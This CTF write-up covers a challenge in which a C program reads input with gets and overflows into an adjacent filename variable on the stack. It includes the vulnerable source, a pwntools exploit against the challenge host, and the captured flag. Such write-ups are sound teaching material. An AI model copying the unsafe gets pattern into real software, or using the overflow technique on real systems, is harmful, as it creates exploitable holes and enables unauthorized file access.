# Stacks of Flags

## Challenge

We are given a binary and source code.

Connecting to the challenge prompts us to enter the name of a flag.
Regardless of our input, the server will respond with a list of fake flags that do not match the flag format.

If we look at the source code, we can see that the server is simply readying from a `available_flags.txt` file.
Our input is stored, but not used in any way.

The comment in the source code reveals that there is a `flag.txt` file, but we have no immediate access to this file.

### Source code

```c
#include <stdio.h>
#include <stdlib.h>

/*
    I still haven't taken the time to move our super secret flag
    in "flag.txt" out of this directory. For now I've just made
    totally sure nobody can access it.
        - "Pops"
    */

int main()
{
    setvbuf ( stdout, NULL , _IONBF , 0 );
    
    char file_name[] = "./available_flags.txt";
    char desired_flag[64];

    printf("Hi! Welcome to the \"Mom and Pops' Flags\" flag search page!");
    printf("\nPlease enter the name of the flag you wish to purchase: ");

    gets(desired_flag);

    FILE *flags = fopen(file_name, "rb");

    printf("\nOh, sorry! We don't have that flag in stock :(\nHere is a list of the available flags:\n");
    char ch;
    while ((ch = fgetc(flags)) != EOF)
        putchar(ch);

    fclose(flags);
    printf("\nPlease come back later!");

    return 0;
}
```

## Solution

The call to `gets` is unsafe and introduces a buffer overflow vulnerability.
It is reading into a buffer of 64 bytes, but we can write more characters than this limit, which will overwrite other local variables.

The `file_name` variable stores the name of the file to read from.
It is also on the stack, below the `desired_flag` buffer.
If we read 64 characters to pad the `desired_flag` buffer, the remainder of our input will go into `file_name`.

To read from `flag.txt`, we send 64 arbitrary characters, followed by `flag.txt`.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host srv1.momandpopsflags.ca --port 1946 search_source
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('search_source')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'srv1.momandpopsflags.ca'
port = int(args.PORT or 1946)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

payload = flat({
    0x60-0x20: b"flag.txt",
    })
io.sendlineafter(b"Please enter the name of the flag you wish to purchase: ", payload)

io.interactive()
```

## Flag

```
magpie{5tumBl3D_tH3_5t4cK_4h502aBAS76}
```
